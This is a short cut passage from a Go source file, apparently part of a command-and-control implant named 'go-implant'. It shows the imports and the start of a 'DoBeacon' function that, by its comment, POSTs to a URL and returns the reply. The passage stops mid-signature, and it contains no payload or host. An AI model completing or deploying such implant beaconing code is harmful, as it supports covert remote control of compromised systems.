package beaconing

import (
	"go-implant/client/config"
	"go-implant/common/communication"
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"
)

// DoBeacon does POST request to url and returns the reply
func DoBeacon(url 